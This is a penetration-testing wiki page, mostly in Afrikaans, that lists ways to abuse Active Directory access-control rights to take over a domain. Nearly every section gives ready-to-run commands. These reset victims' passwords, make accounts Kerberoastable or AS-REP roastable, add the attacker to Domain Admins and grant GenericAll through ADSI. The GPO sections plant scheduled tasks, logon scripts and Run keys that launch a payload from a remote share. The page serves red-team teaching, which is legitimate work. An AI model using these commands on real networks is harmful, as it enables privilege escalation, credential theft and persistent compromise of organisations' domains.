# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is hoofsaaklik 'n samevatting van die tegnieke uit** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, raadpleeg die oorspronklike artikels.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Hierdie bevoegdheid verleen 'n aanvaller volle beheer oor 'n teiken-gebruikersrekening. Sodra `GenericAll` regte bevestig is met die `Get-ObjectAcl` opdrag, kan 'n aanvaller:

- **Change the Target's Password**: Using `net user <username> <password> /domain`, the attacker can reset the user's password.
- **Targeted Kerberoasting**: Ken 'n SPN toe aan die gebruiker se rekening om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT) hashes uit te trek en te probeer kraak.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Skakel pre-authentication vir die gebruiker af, waardeur hul rekening kwesbaar word vir ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll regte op Groep**

Hierdie voorreg stel 'n aanvaller in staat om groepslidmaatskappe te manipuleer as hulle `GenericAll` regte op 'n groep soos `Domain Admins` het. Nadat hulle die groep se distinguished name met `Get-NetGroup` geïdentifiseer het, kan die aanvaller:

- **Voeg hulself by die `Domain Admins` groep**: Dit kan gedoen word via direkte opdragte of deur modules soos Active Directory of PowerSploit te gebruik.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Vanaf Linux kan jy ook BloodyAD benut om jouself by arbitrêre groepe te voeg wanneer jy GenericAll/Write membership oor hulle het. As die teikengroep genest is in “Remote Management Users”, sal jy onmiddellik WinRM toegang kry op hosts wat daardie groep eer:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Om hierdie voorregte op 'n rekenaarvoorwerp of 'n gebruikersrekening te hê, maak dit moontlik om:

- **Kerberos Resource-based Constrained Delegation**: Maak dit moontlik om 'n rekenaarvoorwerp oor te neem.
- **Shadow Credentials**: Gebruik hierdie tegniek om as 'n rekenaar of gebruikersrekening op te tree deur die voorregte te misbruik om shadow credentials te skep.

## **WriteProperty on Group**

As 'n gebruiker `WriteProperty`-regte op alle voorwerpe vir 'n spesifieke groep (bv. `Domain Admins`) het, kan hulle:

- **Voeg hulself by die Domain Admins-groep**: Dit kan bereik word deur die `net user`- en `Add-NetGroupUser`-opdragte te kombineer; hierdie metode maak privilege escalation binne die domein moontlik.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-lidmaatskap) op Groep**

Hierdie voorreg stel aanvalers in staat om hulself by spesifieke groepe te voeg, soos `Domain Admins`, deur opdragte wat groepslidmaatskap direk manipuleer. Deur die volgende opdragreeks te gebruik, kan hulle hulself byvoeg:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

'n Gelyksoortige voorreg, dit laat aanvallers toe om hulself direk by groepe te voeg deur groeps-eienskappe te wysig as hulle die `WriteProperty` reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word uitgevoer met:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Om die `ExtendedRight` op 'n gebruiker vir `User-Force-Change-Password` te hê, maak dit moontlik om wagwoorde terug te stel sonder om die huidige wagwoord te ken. Die verifikasie van hierdie reg en die uitbuiting daarvan kan deur PowerShell of alternatiewe command-line tools gedoen word, en bied verskeie metodes om 'n gebruiker se wagwoord te herstel, insluitend interactive sessions en one-liners vir non-interactive omgewings. Die opdragte wissel van eenvoudige PowerShell-oproepe tot die gebruik van `rpcclient` op Linux, en demonstreer die veelsydigheid van attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner op groep**

As 'n aanvaller ontdek dat hulle `WriteOwner`-regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral invloedryk wanneer die betrokke groep `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepseienskappe en lidmaatskap moontlik maak. Die proses behels die identifisering van die korrekte objek met `Get-ObjectAcl` en daarna die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig — hetsy deur SID of naam.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite op Gebruiker**

Hierdie toestemming stel 'n aanvaller in staat om gebruiker-eienskappe te wysig. Spesifiek, met `GenericWrite` toegang kan die aanvaller die pad na die aanmeldskrip van 'n gebruiker verander om 'n kwaadwillige skrip by gebruiker-aanmelding uit te voer. Dit word bereik deur die `Set-ADObject` opdrag te gebruik om die `scriptpath` eienskap van die teiken-gebruiker by te werk sodat dit na die aanvaller se skrip wys.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Met hierdie voorreg kan aanvallers groepslidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n credential object, dit te gebruik om gebruikers by 'n groep te voeg of te verwyder, en die lidmaatskapveranderinge met PowerShell-opdragte te verifieer.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Om 'n AD-objek te besit en om `WriteDACL`-privileges daarop te hê, stel 'n aanvaller in staat om hulself `GenericAll`-privileges oor die objek toe te ken. Dit word bereik deur ADSI-manipulasie, wat volle beheer oor die objek en die vermoë om sy groepslidmaatskappe te wysig, moontlik maak. Tog bestaan daar beperkings wanneer mens probeer om hierdie privileges te misbruik met die Active Directory-module se `Set-Acl` / `Get-Acl` cmdlets.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikasie op die domein (DCSync)**

Die DCSync-aanval maak gebruik van spesifieke replikasiepermsies op die domein om 'n Domain Controller na te boots en data, insluitend gebruikersbewyse, te sinkroniseer. Hierdie kragtige tegniek vereis permsies soos `DS-Replication-Get-Changes`, wat aanvallers toelaat om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot 'n Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegasie <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-delegasie

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur kan beduidende sekuriteitsrisiko's inhou. Byvoorbeeld, as aan 'n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer is, kan hulle voorregte hê soos **WriteProperty**, **WriteDacl**, en **WriteOwner**. Hierdie regte kan misbruik word vir kwaadwillige doeleindes, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO-permissies opspoor

Om verkeerd gekonfigureerde GPOs te identifiseer, kan PowerSploit se cmdlets aanmekaar gekoppel word. Dit laat toe om GPOs te ontdek wat 'n spesifieke gebruiker mag bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars met 'n gegewe beleid toegepas**: Dit is moontlik om te bepaal op watter rekenaars 'n spesifieke GPO toegepas is, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Beleide toegepas op 'n gegewe rekenaar**: Om te sien watter beleide op 'n bepaalde rekenaar toegepas is, kan opdragte soos `Get-DomainGPO` gebruik word.

**OUs waarop 'n gegewe beleid toegepas is**: Die identifisering van organisasie-eenhede (OUs) wat deur 'n gegewe beleid geaffekteer word, kan met `Get-DomainOU` gedoen word.

Jy kan ook die hulpmiddel [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs te verken en probleme daarin te vind.

### Misbruik GPO - New-GPOImmediateTask

Verkeerd gekonfigureerde GPOs kan uitgebuit word om kode uit te voer, byvoorbeeld deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gebruik word om 'n gebruiker by die plaaslike administratorsgroep op geraakte masjiene te voeg, wat bevoegdhede beduidend verhoog:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Die GroupPolicy module, indien geïnstalleer, maak dit moontlik om nuwe GPOs te skep en te koppel, en om voorkeure soos registry values te stel om backdoors op aangetaste rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat 'n gebruiker op die rekenaar aanmeld vir uitvoering:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse bied 'n metode om bestaande GPOs te abuse deur take by te voeg of instellings te wysig sonder die behoefte om nuwe GPOs te skep. Hierdie tool vereis die wysiging van bestaande GPOs of die gebruik van RSAT tools om nuwe GPOs te skep voordat veranderinge toegepas word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Dwing beleidsopdatering

GPO-opdaterings gebeur gewoonlik ongeveer elke 90 minute. Om hierdie proses te versnel, veral nadat ’n verandering toegepas is, kan die `gpupdate /force` opdrag op die teikenrekenaar gebruik word om ’n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPOs toegepas word sonder om te wag vir die volgende outomatiese opdateringsiklus.

### Onder die kap

By die inspeksie van die Geskeduleerde take vir ’n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur skripte of opdragreël-gereedskap wat daarop gemik is om stelselgedrag te verander of privileges te eskaleer.

Die struktuur van die taak, soos getoon in die XML-konfigurasielêer wat deur `New-GPOImmediateTask` gegenereer is, beskryf die besonderhede van die geskeduleerde taak — insluitende die opdrag wat uitgevoer moet word en sy triggers. Hierdie lêer verteenwoordig hoe geskeduleerde take binne GPOs gedefinieer en bestuur word, en bied ’n metode om arbitrêre opdragte of skripte uit te voer as deel van beleidstoepassing.

### Users and Groups

GPOs laat ook toe dat gebruiker- en groep-lidmaatskappe op teikenstelsels gemanipuleer word. Deur die Users and Groups beleidslêers direk te wysig, kan aanvallers gebruikers by bevoorregte groepe voeg, soos die plaaslike `administrators` groep. Dit is moontlik deur die delegasie van GPO-bestuursregte, wat die wysiging van beleidslêers toelaat om nuwe gebruikers by te voeg of groepslidmaatskappe te verander.

Die XML-konfigurasielêer vir Users and Groups beskryf hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke gebruikers verhoogde regte oor aangetaste stelsels verkry. Hierdie metode bied ’n direkte benadering tot privilege escalation deur GPO-manipulasie.

Verder kan addisionele metodes vir die uitvoer van kode of die handhawing van persistentie oorweeg word, soos die gebruik van logon/logoff scripts, die wysiging van registry keys vir autoruns, die installering van sagteware via .msi-lêers, of die redigering van service configurations. Hierdie tegnieke bied verskeie paaie om toegang te behou en teikenstelsels te beheer deur die misbruik van GPOs.

## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
